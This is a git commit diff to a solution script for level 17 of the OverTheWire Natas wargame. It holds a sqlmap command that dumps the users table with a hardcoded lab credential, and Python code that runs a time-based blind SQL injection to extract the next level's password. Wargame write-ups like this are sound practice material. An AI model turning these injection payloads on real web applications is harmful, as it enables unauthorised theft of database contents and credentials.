d8008a0e1efd99186b03dd221a90aebd4ac2dc44
Mikael Kall <kall.micke@gmail.com>
2018-01-12 13:27:45 +0100

    Fixed level17.py

--- natas/level17.py
+++ natas/level17.py
@@ -7,6 +7,9 @@
   # Cheat with sqlmap.
   sqlmap --auth-type=basic --auth-cred=natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw -u http://natas17.natas.labs.overthewire.org/index.php --data="username=a" -p username --level=5 --user-agent=Mozilla --dbms=MySQL --threads 4 -D natas17 -T users --dump
 
+  # Disclaimer 
+  Had to cheat by looking on SQL query from a working writeup as could not get the timing to work correctly.
+
 """
 __author__ = 'kall.micke@gmail.com'
 
@@ -30,7 +33,6 @@ def bruteforce_blind_injection():
    for c in chars:
        t1 = datetime.datetime.now()
        r = requests.get(host + '?username=natas18" AND password LIKE BINARY "%' + c + '%" AND SLEEP(2)=0 AND "V"="V', auth=(user, password))
-
        t2 = datetime.datetime.now()    
 
        if (t2 - t1).seconds > 1:
@@ -41,7 +43,7 @@ def bruteforce_blind_injection():
    for i in range(32):
        for c in parsedChars:
 	  t1 = datetime.datetime.now()
-          r = requests.get(host + '?username=natas18" AND password LIKE BINARY "%' + flag + c + '%" AND SLEEP(2)=0 AND "V"="V', auth=(user, password))
+          r = requests.get(host + "?username=natas18%22%20AND%20ASCII(SUBSTR(password,"+str(len(flag)+1)+",1))=ASCII(%22"+str(c)+"%22)%20AND%20SLEEP(2)%20AND%20%22a%22=%22a&debug=true", auth=(user, password))
 	  t2 = datetime.datetime.now()
 
           if (t2 - t1).seconds > 1:
